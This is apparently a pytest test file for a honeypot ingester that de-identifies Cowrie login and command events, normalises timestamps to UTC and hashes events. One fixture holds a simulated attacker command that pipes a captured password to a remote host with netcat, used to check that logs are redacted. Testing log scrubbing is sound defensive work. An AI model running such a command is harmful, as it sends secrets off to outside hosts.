import json
from datetime import UTC, datetime

import pytest

from vulnmaze.common.deid import REDACTED, SRC_IP_TOKEN
from vulnmaze.ingest.normalize import SessionSecrets, event_hash, normalise, parse_ts


def _norm(event, deid, secrets):
    """Normalise one event dict as the ingester would."""
    return normalise(event, json.dumps(event), deid, secrets)


def test_login_and_command_are_deidentified(deid):
    """Raw IPs and passwords never reach the row, and later commands are scrubbed of both."""
    secrets = SessionSecrets()
    login = _norm({"eventid": "cowrie.login.success", "session": "s1", "timestamp": "2026-10-01T00:00:00Z",
                   "src_ip": "198.51.100.9", "username": "root", "password": "hunter22",
                   "message": "login attempt [root/hunter22] succeeded"}, deid, secrets)
    cmd = _norm({"eventid": "cowrie.command.input", "session": "s1", "timestamp": "2026-10-01T00:00:05Z",
                 "input": "echo hunter22 | nc 198.51.100.9 80"}, deid, secrets)
    stored = json.dumps([login.data, cmd.data, cmd.input, login.src_ip_hmac])
    assert "198.51.100.9" not in stored and "hunter22" not in stored
    assert login.password_hmac == deid.secret("hunter22") and login.password_len == 8
    assert login.src_prefix == "198.51.0.0/16"
    assert cmd.input == f"echo {REDACTED} | nc {SRC_IP_TOKEN} 80"
    assert cmd.src_ip_hmac == login.src_ip_hmac


def test_event_without_session_is_rejected(deid):
    """Events missing eventid or session raise instead of being stored half-empty."""
    with pytest.raises(ValueError):
        _norm({"eventid": "cowrie.session.connect", "timestamp": "2026-10-01T00:00:00Z"}, deid, SessionSecrets())


def test_timestamps_are_always_utc():
    """ISO strings with Z, naive strings and epoch numbers all become aware UTC datetimes."""
    expected = datetime(2026, 10, 1, tzinfo=UTC)
    assert parse_ts({"timestamp": "2026-10-01T00:00:00Z"}) == expected
    assert parse_ts({"timestamp": "2026-10-01T08:00:00+08:00"}) == expected
    assert parse_ts({"timestamp": "2026-10-01T00:00:00"}) == expected
    assert parse_ts({"time": expected.timestamp()}) == expected


def test_event_hash_ignores_surrounding_whitespace():
    """Re-reading the same line with a trailing newline gives the same idempotency key."""
    assert event_hash('{"a":1}\n') == event_hash('{"a":1}')
